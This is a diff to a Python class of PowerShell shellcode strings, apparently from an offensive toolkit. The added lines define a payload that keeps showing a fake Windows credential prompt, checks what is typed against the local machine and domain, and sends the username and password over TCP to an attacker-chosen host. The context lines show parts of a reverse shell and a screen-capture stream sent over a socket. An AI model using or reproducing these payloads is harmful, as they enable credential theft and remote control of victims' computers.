@@ -165,6 +165,7 @@ class SHELLCODE(object):
         "$backres  = $commandback + 'PS ' + (Get-Location).Path + '> ';$x = ($error[0] | Out-String);$error.clear();"
         "$backres = $backres + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
         "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
+
     windows_ps_rev_watch_screen = (
         "while ($true){try{Add-Type -AssemblyName System.Windows.Forms;"
         "[System.IO.MemoryStream];$MemoryStream = New-Object System.IO.MemoryStream;"
@@ -180,6 +181,19 @@ class SHELLCODE(object):
         "$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();"
         "$str = \"`n`n--boundary`n\" + \"Content-Type: image/jpeg`n\" + \"Content-Length: $length`n`n\";"
         "SendStrResponse $socket $str;SendResponse $socket $Bytes}$MemoryStream.Close()}catch{Write-Warning \"Something went wrong!\"; Write-Error $_}}")
+    
+    windows_ps_ask_creds_tcp = (
+        "$ErrorActionPreference=\"SilentlyContinue\";Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
+        "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
+        "$domainDN = \"LDAP://\" + ([ADSI]\"\").distinguishedName;"
+        "while($true){$credential = $host.ui.PromptForCredential(\"Credentials are required to perform this operation!\", \"\", \"\", \"\");"
+        "if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String];"
+        "$pass = $creds.password;[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);"
+        "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
+        "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$output = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name8;"
+        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
+        "$send = ([text.encoding]::ASCII).GetBytes('='*30 + $output + '='*30);"
+        "$stream.Write($send,0,$send.Length);$client.Close();break}}}")
 
     injectwindows = """
 #/usr/bin/python
